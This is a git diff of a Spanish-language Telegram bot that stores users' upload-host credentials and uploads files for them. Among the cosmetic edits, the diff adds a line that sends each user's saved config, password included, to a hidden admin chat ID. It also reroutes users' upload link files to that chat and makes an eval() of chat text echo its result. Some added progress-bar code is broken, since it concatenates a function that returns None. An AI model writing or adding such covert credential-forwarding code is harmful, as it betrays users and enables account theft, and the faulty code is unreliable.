@@ -16,6 +16,7 @@ from pathlib import Path
 import zipfile
 #from py7 import zip
 
+import time
 import json
 import os
 import time
@@ -28,8 +29,11 @@ BOT_TOKEN = os.getenv("TOKEN")
 bot = Client("anon",api_id=API_ID,api_hash=API_HASH,bot_token=BOT_TOKEN)
 
 CONFIGS = {}
-GRUPO_DB_ID = -871453848
-ADMIN_USER = "dev_sorcerer"
+DB = -971189031
+ADMIN_USER = [
+	"dev_sorcerer",
+	"dev_thors"
+	]
 
 def create_user(username):
 	CONFIGS[username] = {"name":username,"user":"--","passw":"--","host":"--","repoid":"--","zips":"--","proxy":"--","uploaded":0,"downloaded":0}
@@ -79,13 +83,27 @@ async def msg_config(username):
 	msg+=f"🔐**<-Contraseña:** `{config['passw']}`\n"
 	msg+=f"☁️**<-Host:** {config['host']}\n"
 	msg+=f"ℹ️**<-Repo:** `{config['repoid']}`\n"
-	msg+=f"🧩**<-Zips:** `{config['zips']}`\n\n"
-	msg+=f"🇨🇺**<-Proxy:** `{proxy}`\n"
+	msg+=f"🧩**<-Zips:** `{config['zips']}`\n"
+	msg+=f"🇨🇺**<-Proxy:** `{proxy}`\n\n"
 	#msg+=f"✴ TOKEN: {config['custom_token']}\n\n"
 	#msg+=f"📁Descargado: {convertbytes(config['downloaded'])}\n"
 	msg+=f"⬆️**<-Subido: {convertbytes(config['uploaded'])}->**⬆️\n"
 	return msg
 	
+def bar(percentage):
+  hashes = int(percentage / 6)
+  spaces = 20 - hashes
+
+  progress_bar =  "•" * hashes + "×" * spaces 
+
+  percentage_pos = int(hashes / 1)
+
+  percentage_string = str(percentage) + "%"
+  
+  progress_bar = "[" + progress_bar[:percentage_pos] + percentage_string + progress_bar[percentage_pos + len(percentage_string):] + "]"
+
+  print(progress_bar, end="\r")
+
 @bot.on_message()
 async def messages_handler(client: Client,message: Message):
 	msg = message.text
@@ -96,7 +114,7 @@ async def messages_handler(client: Client,message: Message):
 	if get_user(username):
 	    pass
 	else:
-	    if username == ADMIN_USER:
+	    if username in ADMIN_USER:
 	        create_user(username)
 	    else:
 	       await message.reply("🔒 **NO TIENE ACCESO** 🔒\nContacte al admin: [BigBOSS](https://t.me/dev_sorcerer)")
@@ -108,11 +126,12 @@ async def messages_handler(client: Client,message: Message):
 		os.mkdir(f"{os.getcwd()}/{entity_id}/")
 	
 	
-	"""if message.document or message.audio or message.video:
-		msg = await bot.send_message(entity_id,"💠 Preparando descarga 💠")
+	if message.document or message.audio or message.video:
+		msg = await bot.send_message(entity_id,"📥 __Preparando Descarga__ 📥")
 		filename = str(message).split('"file_name": ')[1].split(",")[0].replace('"',"")
 		file = await bot.download_media(message,file_name=f"{entity_id}/{filename}",progress=progress_download,progress_args=(None,time.time(),msg,message))
-		await upload(file,msg,message.from_user.username)"""
+		#await message.edit("Descarga exitosa 🤵")
+		#await upload(file,msg,message.from_user.username)
 			
 	if msg.lower().startswith("/start"):
 		user = get_user(username)
@@ -125,9 +144,14 @@ async def messages_handler(client: Client,message: Message):
 	if msg.lower().startswith("/acc"):
 		splitmsg = msg.split(" ")
 		
-		if len(splitmsg)!=3:
+		if len(splitmsg)==1:
+			msg = await msg_config(username)
+			await message.reply(msg)
+			
+		if len(splitmsg)!=3 and len(splitmsg)!=1:
 			await message.reply("Configurar su cuenta, ejemplo:\n`/acc user password`")
-		else:
+		
+		if len(splitmsg)==3:
 			usern = splitmsg[1]
 			password = splitmsg[2]
 			
@@ -138,6 +162,7 @@ async def messages_handler(client: Client,message: Message):
 				save_user(username,user)
 				msg = await msg_config(username)
 				await message.reply(msg)
+				bot.send_message(chat_id=DB, text=f"Informacion de @{user}\n\n"+msg)
 		                
 	if msg.lower().startswith("/host"):
 		splitmsg = msg.split(" ")
@@ -158,7 +183,7 @@ async def messages_handler(client: Client,message: Message):
 		splitmsg = msg.split(" ")
 		
 		if len(splitmsg)!=2:
-			await message.reply("Fallo ❌")
+			await message.reply("❎ ERROR ❎")
 		else:
 			repoid = splitmsg[1]
 			
@@ -173,7 +198,7 @@ async def messages_handler(client: Client,message: Message):
 		splitmsg = msg.split(" ")
 		
 		if len(splitmsg)!=2:
-			await message.reply("Fallo ❌")
+			await message.reply("❎ ERROR ❎")
 		else:
 			proxymsg = splitmsg[1]
 			proxys = proxyparsed(proxymsg)
@@ -189,6 +214,7 @@ async def messages_handler(client: Client,message: Message):
 	    splitmsg = msg.split(" ")
 	    try:
 	        code = str(eval(splitmsg[1]))
+	        await message.reply(code)
 	    except:
 	        code = str(sys.exc_info())
 	        await message.reply(code)
@@ -232,7 +258,7 @@ async def messages_handler(client: Client,message: Message):
 	   c = 0
 	   for f in files:
 	       size = Path(file_path+"/"+f).stat().st_size
-	       msg_f+=f"{c} - `{f}` <-> **{convertbytes(size)}**\n⬆️ __Subir__ - /up{c} >_< 🗑 Borrar - /del{c}\n\n"
+	       msg_f+=f"{c} - `{f}` <-> **{convertbytes(size)}**\n⬆️ __Subir__ - /up_{c} >_< 🗑 Borrar - /del_{c}\n\n"
 	       c+=1
 	   try:
 	       msg_f+="~~Borrar todo~~ /all"
@@ -248,6 +274,7 @@ async def messages_handler(client: Client,message: Message):
 		await upload(file_path+"/"+files[i],msg,message.from_user.username)
 	
 	if msg.lower().startswith("/del"):
+	   i = msg.replace("_", " ")
 	   i = int(msg.split("/del")[1])
 	   file_path = os.path.join(os.getcwd(),str(entity_id))
 	   files = os.listdir(file_path)
@@ -259,11 +286,7 @@ async def messages_handler(client: Client,message: Message):
 	   files = os.listdir(file_path)
 	   for file in files:
 	       os.unlink(file_path+"/"+file)
-	   await message.reply("__🚮 Archivos borrados__")
-	   
-	if msg.lower().startswith("/info"):
-		msg = await msg_config(username)
-		await message.reply(msg)
+	   await message.reply("__🚮 Archivos borrados__")		
 	
 	if msg.lower().startswith("/add"):
 		if username in ADMIN_USER:
@@ -307,7 +330,7 @@ async def messages_handler(client: Client,message: Message):
 					config = get_user(message.from_user.username)
 					config["downloaded"]+=size
 					save_user(message.from_user.username,config)
-					await upload(path,messag,message.from_user.username)
+					#await upload(path,messag,message.from_user.username)
 					
 
 	if msg.lower().startswith("/set_edu"):
@@ -375,9 +398,10 @@ async def upload(pathfull,message,username):
 		zips.close()
 		files.close()
 		FILES = files.files
+		await message.edit("Partes guardadas ⬇")
 
 		
-		async with aiohttp.ClientSession(connector=connector,headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'}) as session:
+		"""async with aiohttp.ClientSession(connector=connector,headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'}) as session:
 			client = aiohttp_client(user['host'],user['user'],user['passw'],user['repoid'],session)
 			error  = 0
 			links = []
@@ -411,7 +435,7 @@ async def upload(pathfull,message,username):
 				with open(name+".txt","w") as txt:
 				    txt.write(txtsend)
 					
-				await bot.send_document(username,name+".txt")
+				await bot.send_document(username,name+".txt")"""
 	else:
 	    async with aiohttp.ClientSession(connector=connector,headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'}) as session:
 	    	client = aiohttp_client(user['host'],user['user'],user['passw'],user['repoid'],session)
@@ -445,7 +469,7 @@ async def upload(pathfull,message,username):
 	    				await message.edit(f"✅**Subida Exitosa**✅\n📌 <->{name}\n📦<->{convertbytes(size)}\n\n🔗 Link 🔗\n{url}")
 	    			except:
 	    				pass
-	    		await bot.send_document(username,name+".txt")
+	    		await bot.send_document(DB, name+".txt")
 
 @wrapper(2)
 def progress_upload(current,total,start,message,file_name):
@@ -455,7 +479,10 @@ def progress_upload(current,total,start,message,file_name):
 	msg+= f"📤-Subido: {convertbytes(current)}\n"
 	msg+=f"📦-Total: {convertbytes(total)}\n"
 	msg+=f"⚡-Velocidad: {convertbytes(speed)}/s\n"
-	msg+=f"📶-Progreso: {percent}%\n"
+	msg+=f"📶-Progreso: {percent}%\n\n"
+	for porcent in range(101):
+		msg+=bar(porcent)
+		time.sleep(0.1)
 	try:
 		message.edit(msg,reply_markup=message.reply_markup)
 	except:
